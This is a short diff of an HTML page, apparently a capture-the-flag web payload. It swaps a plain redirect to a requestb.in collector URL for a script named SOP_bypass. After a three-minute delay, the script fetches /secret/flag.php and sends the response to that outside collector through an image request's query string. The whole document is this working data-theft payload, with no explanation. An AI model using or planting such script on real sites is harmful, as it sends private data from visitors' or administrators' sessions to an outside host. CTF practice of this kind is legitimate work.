@@ -1,7 +1,13 @@
 <html>
 <body>
 <script>
-  document.location='http://requestb.in/14tl3qr1';
+  setTimeout(function SOP_bypass() {
+    $.get('/secret/flag.php', function(data) {
+        // action with data
+        var image = new Image();
+        image.src='http://requestb.in/14tl3qr1?flag='+data;
+    });
+}, 180000);
 </script>
 </body>
 </html>
